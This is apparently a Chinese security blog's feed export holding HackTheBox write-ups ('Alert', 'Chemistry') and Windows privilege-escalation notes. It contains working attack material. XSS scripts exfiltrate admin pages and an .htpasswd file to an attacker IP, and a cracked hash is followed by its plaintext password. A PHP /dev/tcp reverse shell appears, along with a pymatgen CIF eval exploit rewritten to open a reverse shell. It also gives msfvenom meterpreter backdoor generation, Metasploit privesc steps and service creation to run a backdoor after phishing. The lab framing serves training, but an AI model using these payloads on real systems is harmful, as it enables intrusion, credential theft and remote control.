class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---        12/13/2024  11:45 PM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt</span><br><span class="line">c453aa7121957348d4d4f383383f48fe</span><br></pre></td></tr></table></figure><h3 id="恢复时间"><a href="#恢复时间" class="headerlink" title="恢复时间"></a>恢复时间</h3><p><a href="https://www.bdpnt.com/kepu/2667.html">https://www.bdpnt.com/kepu/2667.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-Alert</title>
      <link href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"/>
      <url>/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157852400-389493bf-f21e-4539-adfb-7a9fceb78f2d.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734079889364-48ed658e-a906-4215-96cf-83686963ea1d.png"></p><p>开放端口：22、80，httpserver 是 Apache</p><p>进入 80 端口的网页，发现存在 Markdown 文件上传</p><p>根据Alert，猜测是xss</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734080736755-59392a62-694e-47a7-9f8b-2eb75a462b69.png"></p><h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p>ffuf -w &#x2F;root&#x2F;fuzzDicts&#x2F;subdomainDicts&#x2F;main.txt -u <a href="http://alert.htb/">http://alert.htb</a> -H “Host:FUZZ.alert.htb” -ac</p><p><code>**-ac**</code></p><ul><li>自动过滤响应，排除那些响应大小与其他多数响应相似的请求。</li><li>这个功能有助于减少无关的输出，让模糊测试的结果更聚焦。</li></ul><h3 id="xss漏洞触发点"><a href="#xss漏洞触发点" class="headerlink" title="xss漏洞触发点"></a>xss漏洞触发点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先上传这个脚本，起python8888端口监听，发送过去之后解码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143694804-5e15ed60-1ada-407a-a60a-f629c25944cd.png"></p><p>再发送contact us附上刚才md文件链接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143736344-0fbf6602-74c1-4c35-abaf-cc5375e5c450.png"></p><p>这边猜测后台有管理员机器人自动点击链接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143769013-138d1cc5-e1b5-4374-82ba-9a3970fdd6dc.png"></p><p>发现管理员多个messages界面</p><p>再发一次，同步上述流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143943390-ea143ce1-8ae0-4fab-8c7b-8a038e2f9cb7.png"></p><p>可以开始构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=filepath&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>经过尝试，无法直接读取到 &#x2F;etc&#x2F;passwd 这种敏感文件</p><p>但是考虑到 web 服务器使用的是 Apache，可以参考一下这篇文章</p><p><a href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p><p>于是有效载荷就修改为了这样↓</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.16.11:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142899045-031df263-6648-47c1-bc72-570110d215ea.png"></p><p>%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A</p><p>url解码</p><pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre><p>只保留pre中间的内容到.hash后缀文件中</p><h3 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h3><p>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –format&#x3D;md5crypt-long alert.hash</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141313880-0743371f-a2cf-4836-839e-4f3bfbff65fa.png"></p><p>albert:manchesterunited</p><p>ssh <a href="mailto:&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;">&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;</a></p><p>pa -aux看端口，发现8080开着php或者上传linpeas</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141476707-f41a9979-1bd7-48fb-b38a-ed5299e903b1.png"></p><p>看下进程</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141628448-47b55910-f62c-40dc-9f7a-c403a39e48f3.png"></p><p>看到config这个文件属于root，可以直接修改php内容反弹shell。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141706952-00ddc997-a807-4dbd-a782-f60be3d77fc1.png"></p><p>监听</p><?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.16.11/9999 0>&1'"); ?><p>如果没反应再curl一下127.0.0.1:8080</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142794331-1f8c3933-7475-4d19-9ec7-e93f4556c513.png"></p><h2 id="Chemistry"><a href="#Chemistry" class="headerlink" title="Chemistry"></a>Chemistry</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734158410936-284ccf4d-4dca-4a7d-8a82-fc2b2dba0ece.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157886992-2eb4c7e2-a246-4f73-818c-e1f70bff065d.png"></p><p>nmap扫描</p><p>扫到5000端口</p><h3 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h3><p><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p><h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><p><code>JonesFaithfulTransformation.from_transformation_str()</code>库中的方法存在一个严重的安全漏洞<code>pymatgen</code>。此方法不安全地利用 eval() 来处理输入，在解析不受信任的输入时允许执行任意代码。解析恶意创建的 CIF 文件时可以利用此漏洞。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>漏洞原因在<a href="https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108">pymatgen&#x2F;symmetry&#x2F;settings.py#L97C1-L111C108</a>中，存在缺陷的代码段涉及正则表达式操作，然后使用<code>eval()</code>。</p><h4 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">basis_change = [</span><br><span class="line">    re.sub(r&quot;(?&lt;=\w|\))(?=\() | (?&lt;=\))(?=\w) | (?&lt;=(\d|a|b|c))(?=([abc]))&quot;, r&quot;*&quot;, string, flags=re.X)</span><br><span class="line">    for string in basis_change</span><br><span class="line">]</span><br><span class="line">&quot;&quot;&quot;snip&quot;&quot;&quot;</span><br><span class="line">([eval(x, &#123;&quot;__builtins__&quot;: None&#125;, &#123;&quot;a&quot;: a, &quot;b&quot;: b, &quot;c&quot;: c&#125;) for x in basis_change])</span><br></pre></td></tr></table></figure><p><code>__builtins__</code>即使将 eval设置为，使用 eval<code>None</code>仍存在安全风险。<code>BuiltinImporter</code>可以使用子类遍历来恢复该类。  </p><h3 id="概念证明"><a href="#概念证明" class="headerlink" title="概念证明"></a>概念证明</h3><p>该漏洞可利用如下方式：</p><p><code>vuln.cif</code>创建一个包含以下内容的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;touch pwned&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure><p>然后，使用以下代码解析cif文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pymatgen.io.cif import CifParser</span><br><span class="line">parser = CifParser(&quot;vuln.cif&quot;)</span><br><span class="line">structure = parser.parse_structures()</span><br></pre></td></tr></table></figure><p>利用poc，修改概念证明中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.11/4343 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure><p>传上去解析有问题</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows权限提升</title>
      <link href="/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h1 id="基础点："><a href="#基础点：" class="headerlink" title="基础点："></a>基础点：</h1><p>0、为什么我们要学习权限提升转移技术：</p><p>简单来说就是达到目的过程中需要用到它</p><p>1、具体有哪些权限需要我们了解掌握的：</p><p>后台权限，数据库权限，Web权限，用户权限，服务器权限，宿主机权限，域控制器权限</p><p>2、以上常见权限获取方法简要归类说明：</p><p>后台权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成</p><p>数据库权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成</p><p>Web权限：RCE,反序列化,文件上传等直达或通过后台数据库间接造成</p><p>用户权限：弱口令,数据泄漏等直达或通过Web，服务器及域控转移造成</p><p>服务器权限：系统内核漏洞,钓鱼后门攻击,主机软件安全直达或上述权限提升造成</p><p>宿主机权限：Docker不安全配置或漏洞权限提升直达（服务资产造成入口后提升）</p><p>域控制器权限：内网域计算机用户提升或自身内核漏洞，后门攻击，主机软件安全直达</p><p>3、以上常见权限获取后能操作的具体事情：</p><p>后台权限：文章管理，站点管理，模版管理，数据管理，上传管理等</p><p>数据库权限：操作数据库的权限，数据增删改查等（以数据库用户为主）</p><p>Web权限：源码查看，源码文件增删改查，磁盘文件文件夹查看(以权限配置为主)</p><p>用户权限：就如同自己电脑上普通用户能操作的情况（敏感操作会被禁止）</p><p>服务器权限：就如同自己电脑上能操作的情况（整个系统都是你的）</p><p>宿主机权限：就如同自己电脑上能操作的情况（整个系统都是你的）</p><p>域控制器权限：就如同自己电脑上能操作的情况（整个内网域系统都是你的）</p><p>4、以上常见权限在实战中的应用场景介绍：</p><p>当我们通过弱口令进入到应用后台管理</p><p>当我们下载备份文件获取到数据库信息</p><p>当我们通过漏洞拿到资产系统的Web权限</p><p>当我们在公司被给予账号密码登录计算机或系统</p><p>当我们在公司或钓鱼后门获取到某个公司机器系统</p><p>……………………………….</p><p>1、Web搭建平台差异</p><p>集成软件，自行搭建，虚拟化等</p><p>集成软件：宝塔，PhpStudy，XAMMP等</p><p>自行搭建：自己一个个下载安装搭建配置</p><p>虚拟化：Docker，ESXi，QEMU，Hyper-V等</p><p>2、Web语言权限差异</p><p>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等</p><p>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP</p><p>3、系统用户权限差异</p><p>Windows：</p><p>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。</p><p>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。</p><p>Users：用户组，一般用户的默认组别，拥有较低的系统权限。</p><p>Guests：</p><p>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。</p><p>Backup Operators：</p><p>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。</p><p>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。</p><p>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。</p><p>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。</p><p>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。</p><p>Distributed COM Users：</p><p>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。</p><p>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p><p>Linux：</p><p>系统用户：UID(0-999)</p><p>普通用户：UID(1000-*)</p><p>root用户：UID为0，拥有系统的完全控制权限</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web应用-中间件-数据库"><a href="#Web应用-中间件-数据库" class="headerlink" title="Web应用&amp;中间件&amp;数据库"></a>Web应用&amp;中间件&amp;数据库</h2><p>背景1：通过弱口令进入Web后台系统通过上传获取Web权限</p><p>背景2：通过Tomcat弱口令进入控制界面通过上传获取Web权限</p><p>背景3：通过Redis未授权进入管理端通过SQL执行获取Web权限</p><h2 id="权限转移-后台管理-数据库管理-Web"><a href="#权限转移-后台管理-数据库管理-Web" class="headerlink" title="权限转移-后台管理&amp;数据库管理&amp;Web"></a>权限转移-后台管理&amp;数据库管理&amp;Web</h2><p>Tmall-后台权限-&gt;Web权限（提升）</p><p>Tmall-Web权限-&gt;数据库权限（转移）</p><p>Tmall-Web权限-&gt;另一个后台权限（转移）</p><p>PhpMyadmin-数据管理-&gt;Web权限（提升）</p><p>PhpMyadmin-Web权限-&gt;另一个后台权限（转移）</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>windows提权主要还是溢出漏洞</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1722828883099-792fd309-f2d3-47d5-a30a-a011268e2bf2.png"></p><h2 id="Web到Win-系统提权-宝塔面板-哥斯拉"><a href="#Web到Win-系统提权-宝塔面板-哥斯拉" class="headerlink" title="Web到Win-系统提权-宝塔面板-哥斯拉"></a>Web到Win-系统提权-宝塔面板-哥斯拉</h2><p>Windows 2012(宝塔Apache+PHP)-MSF</p><p>复现搭建：选择2012系统后自行安装宝塔</p><p>哥斯拉插件&#x2F;&#x2F;编码绕过、禁用函数绕过</p><p>Meterpreter</p><p>BypassOpenBaseDir</p><p>BypassDisableFunction</p><h2 id="Web到Win-系统提权-溢出漏洞-MSF-CS"><a href="#Web到Win-系统提权-溢出漏洞-MSF-CS" class="headerlink" title="Web到Win-系统提权-溢出漏洞-MSF&amp;CS"></a>Web到Win-系统提权-溢出漏洞-MSF&amp;CS</h2><p>Windows 2008(IIS+ASP)-MSF</p><p>自行搭建+ASP&#x2F;PHP+Windows 2008</p><p>复现搭建：选择2016系统后自行安装IIS+ASP</p><p>0、MSF安装：（也可以用kali）</p><p>目前的msf版本有bug可以TB上购买pro版本嘎嘎稳</p><p><a href="https://blog.csdn.net/qq_46717339/article/details/122653084">https://blog.csdn.net/qq_46717339/article/details/122653084</a></p><p>1、生成反弹后门</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p><p>LHOST是msf攻击机配置</p><p>2、攻击机msfconsole配置监听会话</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><p>2.1、筛选EXP模块</p><p>全自动：快速识别系统中可能被利用的漏洞</p><p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p><p>set showdescription true</p><p>3、利用EXP溢出提权</p><p>background</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</p><p>set session 1</p><p>exploit</p><p>Windows 2016(IIS+ASP.NET)-CS</p><p>复现搭建：选择2016系统后自行安装IIS+ASP.NET</p><p>0、CS安装</p><p>chmod +x .&#x2F;teamserver</p><p>chmod +x .&#x2F;TeamServerImage</p><p>.&#x2F;teamserver IP password</p><p>1、连接CS</p><p>2、创建监听器</p><p>3、加载脚本插件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724246053021-8b412a41-477f-49fd-adc7-520776ffb99b.png"></p><h2 id="Web到Win-系统提权-人工操作"><a href="#Web到Win-系统提权-人工操作" class="headerlink" title="Web到Win-系统提权-人工操作"></a>Web到Win-系统提权-人工操作</h2><p>如果提权中无法执行命令的话，可以尝试上传cmd.exe到可读写目录再调用</p><p>优点：解决实时更新不集成的EXP</p><p>缺点：操作繁琐，需要各种复现调试</p><p>解决工具或插件无法实时更新，又或者集成较少面对复杂情况下人工操作更适合</p><p>1、信息收集</p><p>参考常见命令（见上图）</p><p>2、补丁筛选</p><p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a>. (已失效)</p><p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>python wes.py systeminfo.txt –color</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311011034-f7cf3728-b7f9-4029-bcc2-fae5883e1d3b.png"></p><p>python wes.py systeminfo.txt –color -i “Elevation of Privilege” &#x2F;&#x2F;权限提升</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311164358-6c1f81a9-c839-456c-a50a-c857ce1617d5.png"></p><p>python wes.py systeminfo.txt –color -i “Elevation of Privilege” -o vuln.csv</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311298993-b6b6f279-7c29-4a54-bed9-ca7925d99555.png"></p><p>3、EXP获取执行</p><p>KernelHub 针对常用溢出编号指定找EXP</p><p>Poc-in-Github 针对年份及编号指定找EXP</p><p>exploitdb 针对类型及关键说明指定找EXP</p><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311556498-26632a85-a253-4017-820f-932200703e4c.png"></p><p><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311885633-d9faf042-7b89-467c-833c-2b15d6bbc4dd.png"></p><p><a href="https://gitlab.com/exploit-database/exploitdb">https://gitlab.com/exploit-database/exploitdb</a></p><h2 id="Web到Win-系统提权-土豆家族"><a href="#Web到Win-系统提权-土豆家族" class="headerlink" title="Web到Win-系统提权-土豆家族"></a>Web到Win-系统提权-土豆家族</h2><p><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p><p>土豆(potato)提权通常用在我们获取WEB&#x2F;数据库权限的时候，</p><p>可以将低权限的服务用户提升为“NT AUTHORITY\SYSTEM”特权。</p><p>1、Test in：Windows 10&#x2F;11（1809&#x2F;21H2）</p><p>2、Test in：Windows Server 2019Datacenter(1809)</p><p>3、Test in：Windows Server 2022Datacenter(21H2)</p><p>OK的是实验中成功提权的</p><p>SweetPotato OK</p><p>RoguePotato</p><p>BadPotato OK</p><p>EfsPotato OK</p><p>GodPotato OK</p><p>PetitPotato OK</p><p>MultiPotato</p><p>CandyPotato</p><p>RasmanPotato OK</p><p>CoercedPotato</p><p>JuicyPotatoNG</p><p>PrintNotifyPotato OK</p><p>下载完直接用visual studio打开运行就行</p><p>GodPotato</p><p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p><p>SweetPotato</p><p><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p><p>RoguePotato</p><p><a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><p>BadPotato</p><p><a href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a></p><p>EfsPotato</p><p><a href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a></p><p>MultiPotato</p><p><a href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a></p><p>CandyPotato</p><p><a href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a></p><p>RasmanPotato</p><p><a href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a></p><p>PetitPotato</p><p><a href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a></p><p>JuicyPotatoNG</p><p><a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></p><p>PrintNotifyPotato</p><p><a href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a></p><p>CoercedPotato</p><p><a href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a></p><h2 id="钓鱼成功场景"><a href="#钓鱼成功场景" class="headerlink" title="钓鱼成功场景"></a>钓鱼成功场景</h2><p>应用场景：</p><p>1、常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p><p>2、内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p><p>比如计算机管理员用户执行了木马文件，上线后为adminnistrator权限，此时想看net user &#x2F;域名</p><p>域内用户，但是计算机管理员权限不行，因为它属于计算机本机的管理员不算域内成员，此时要么升权限到system获取计算机系统权限，要么降低权限到域内用户</p><p>主要当前技术入口点：</p><p>-当前权限由钓鱼攻击获取</p><p>主要当前技术应用点：</p><p>-当前受控机在内网域环境</p><p>1、提权system与内网交互</p><p>2、降权到域用户与内网交互</p><p>net user查看计算机用户</p><p>net user &#x2F;domainname 查看域内用户</p><p>cs内执行命令前面加shell </p><p>shell net user </p><h3 id="服务启动（提权）"><a href="#服务启动（提权）" class="headerlink" title="服务启动（提权）"></a>服务启动（提权）</h3><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>适用版本：windows 7、10、08、12、16、19、22，早期用at命令</p><p>1、创建一个名叫syscmd的执行文件服务</p><p>sc Create syscmd binPath&#x3D;”c:\msf.exe” </p><p>2、运行服务</p><p>sc start syscmd</p><p>#远程控制（提权）</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>psexec.exe -accepteula -s -i -d cmd 